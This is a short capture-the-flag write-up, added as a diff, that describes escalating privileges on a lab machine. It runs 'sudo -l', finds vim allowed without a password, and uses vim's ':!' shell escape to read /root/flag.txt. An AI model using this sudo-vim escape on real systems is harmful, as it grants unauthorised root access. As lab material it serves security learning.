@@ -1,0 +1,15 @@
+After getting into the terminal
+
+we found that the permission is denied for either getting into the /root directory and cat the flag.txt
+
+then we use
+
+> sudo -l 
+
+to see if anything that we can do
+found that we can run /usr/bin/vim without password
+
+> sudo /usr/bin/vim
+> :!cat /root/flag.txt
+
+and we got the flag
